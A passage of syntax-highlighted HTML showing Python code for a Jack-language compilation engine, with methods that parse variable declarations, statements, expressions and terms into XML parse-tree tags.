TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"var"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse var type</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">or</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse var name</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the rest var name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">";"</span>):</span><br><span class="line">            <span class="comment"># parse ","</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">","</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse var name</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># parse the end symbol  </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">";"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid var define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end of class var descrtion</span></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/varDec&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileStatements</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;statements&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">             (self.parser.keyWord() == <span class="string">"do"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"if"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"while"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"let"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"return"</span>):</span><br><span class="line">            <span class="keyword">if</span> self.parser.keyWord() == <span class="string">"do"</span>:</span><br><span class="line">                self.compileDo()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"if"</span>:</span><br><span class="line">                self.compileIf()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"while"</span>:</span><br><span class="line">                self.compileWhile()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"let"</span>:</span><br><span class="line">                self.compileLet()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"return"</span>:</span><br><span class="line">                self.compileReturn()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid statement define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/statements&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileDo</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;doStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse do</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"do"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid do  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"("</span>):</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid do statement  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression list</span></span><br><span class="line">        self.compileExpressionList()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse ')'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid do statement body define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  ';'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">';'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid do statement  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/doStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileLet</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;letStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse let </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"let"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse varname</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.identifier())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse `[expression]`</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">'['</span>:</span><br><span class="line">            <span class="comment"># parse '['</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            self.compileExpression()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse ']'</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">               self.parser.symbol() == <span class="string">']'</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  '='</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">'='</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  ';'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">';'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/letStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileWhile</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;whileStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"while"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">'('</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  ')'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">')'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  '&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">'&#123;'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.compileStatements()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  '&#125;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">'&#125;'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/whileStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileReturn</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;returnStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"return"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if return statement!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression  list</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">';'</span>):</span><br><span class="line">            self.compileExpression()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse ';'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">';'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if return statement!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/returnStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileIf</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;ifStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse if </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"if"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse ')'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse '&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"&#123;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.compileStatements()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '&#125;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"&#125;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse else</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"else"</span>:</span><br><span class="line">            <span class="comment"># parse 'else'</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># parse '&#123;'</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&#123;"</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse statements</span></span><br><span class="line">            self.compileStatements()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># parse '&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&#125;"</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/ifStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileExpression</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;expression&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse term</span></span><br><span class="line">        self.compileTerm()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse op</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.symbol() == <span class="string">"+"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"-"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"*"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"/"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&amp;"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"|"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&gt;"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"&lt;"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"="</span>):</span><br><span class="line">            <span class="comment"># parse op</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse term</span></span><br><span class="line">            self.compileTerm()</span><br><span class="line">        </span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/expression&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileTerm</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;term&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">            <span class="comment"># parse int const</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.intVal())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">            <span class="comment"># parse string const</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.stringVal())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">            <span class="comment"># parse keword const</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.keyWord() == <span class="string">"true"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"false"</span> <span class="keyword">or</span> \</span><br><span class="line">               self.parser.keyWord() == <span class="string">"null"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"this"</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"inValid expression define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="keyword">if</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">                <span class="comment"># parse '('</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.compileExpression()</span><br><span class="line">                <span class="comment"># parse ')'</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">                   self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">                (self.parser.symbol() == <span class="string">"-"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"~"</span>):</span><br><span class="line">                <span class="comment"># parse unaryOp</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse term</span></span><br><span class="line">                self.compileTerm()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            <span class="comment"># parse subroutineName or varName</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"["</span>:</span><br><span class="line">                <span class="comment"># parse '['</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.compileExpression()</span><br><span class="line">                <span class="comment"># parse ']'</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"]"</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span 